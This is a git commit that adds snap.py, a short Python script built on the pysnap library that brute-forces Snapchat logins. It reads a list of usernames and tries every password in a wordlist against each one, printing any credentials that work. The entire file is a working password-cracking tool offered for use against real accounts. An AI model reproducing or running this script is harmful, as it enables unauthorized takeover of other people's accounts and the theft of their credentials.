2bbb3ebbf7b147118f836a0c6f93dbb102144ae5
saw-kurd <77323110+saw-kurd@users.noreply.github.com>
2021-02-19 21:24:40 +0300

    Create snap.py

---
+++ snap.py
@@ -0,0 +1,23 @@
+#!/lewan
+
+from pysnap import Snapchat
+import sys
+import os
+
+def lewan(username):
+	print("now cracking: " + username)
+	snapchat = Snapchat()
+	passwords = open("lewan.txt","r")
+	i = 0
+	for password in passwords:
+		result = snapchat.login(username,password)
+		if (result['logged']!=False):
+			print("success: username: " + username + "\t password: " + password)
+			break
+		else:
+			print(str(i))
+			i+=1
+
+names = open("users/lewan.txt","r")
+for name in names:
+	lewan(name)
